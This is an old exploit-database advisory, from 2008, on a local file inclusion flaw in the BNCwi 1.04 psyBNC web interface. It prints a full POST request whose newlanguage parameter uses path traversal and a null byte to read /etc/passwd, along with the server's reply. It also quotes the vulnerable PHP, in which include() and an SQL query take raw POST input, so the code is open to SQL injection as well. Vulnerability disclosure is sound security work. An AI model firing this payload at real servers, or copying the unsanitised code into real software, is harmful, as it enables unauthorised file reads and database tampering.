@@ -1,0 +1,69 @@
+  :::::::-.   ...    ::::::.    :::.
+   ;;,   `';, ;;     ;;;`;;;;,  `;;;
+   `[[     [[[['     [[[  [[[[[. '[[
+    $$,    $$$$      $$$  $$$ "Y$c$$
+    888_,o8P'88    .d888  888    Y88
+    MMMMP"`   "YmmMMMM""  MMM     YM
+
+   [ Discovered by dun \ dun[at]strcpy.pl ]
+
+ ###########################################################
+ #  [ BNCwi <= 1.04 ]  Local File Inclusion Vulnerability  #
+ ###########################################################
+ #
+ # Script: "BNCwi is a Open-Source webinterface for psyBNC. 
+ #		    With it you easily can manage your Bouncer via a graphical interface."
+ #
+ # Download: http://sourceforge.net/projects/bncwi/
+ #
+ # [LFI] Vuln: http://site.com/bncwi/index.php
+ #	
+ # 	POST /bncwi/index.php HTTP/1.1
+ #	
+ #	Host: www.site.com
+ #	User-Agent: Mozilla/5.0
+ #	Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+ #	Accept-Language: pl,en-us;q=0.7,en;q=0.3
+ #	Accept-Encoding: gzip,deflate
+ #	Accept-Charset: ISO-8859-2,utf-8;q=0.7,*;q=0.7
+ #	Keep-Alive: 300
+ #	Connection: keep-alive
+ #	Content-Type: application/x-www-form-urlencoded
+ #	Content-Length: 49
+ #	
+ #	newlanguage=../../../../../../../../etc/passwd%00
+ #	
+ #	HTTP/1.x 200 OK
+ #	Date: Fri, 05 Dec 2008 01:27:15 GMT
+ #	Server: Apache
+ #	X-Powered-By: PHP/5.2.6-pl7-gentoo
+ #	Keep-Alive: timeout=15, max=100
+ #	Connection: Keep-Alive
+ #	Transfer-Encoding: chunked
+ #	Content-Type: text/html
+ #     
+ # Bug: ./bncwi-1.04/index.php (lines: 47-56)
+ #
+ # ...
+ #	if(isset($_POST['newlanguage']))
+ #	{
+ #		setcookie("bncwi_language", $_POST['newlanguage'], time()+60*60*24*30);
+ #		if($_SESSION['logedin'] == "1")
+ #		{
+ #			mysql_query("UPDATE `$table_customers` SET `language` = '$_POST[newlanguage]' WHERE `serverid` = $_SESSION[server_id] AND BINARY `login` = '$_SESSION[USER_LOGIN]' LIMIT 1;");
+ #		}
+ #		$_SESSION['language'] = $_POST['newlanguage'];
+ #		include("lang_".$_POST['newlanguage'].".inc.php");								//LFI
+ #	}
+ # ... 	 
+ #
+ #
+ ###############################################
+ # Greetz: D3m0n_DE * str0ke * and otherz..
+ ###############################################
+
+ [ dun / 2008 ] 
+
+*******************************************************************************************
+
+# milw0rm.com [2008-12-04]
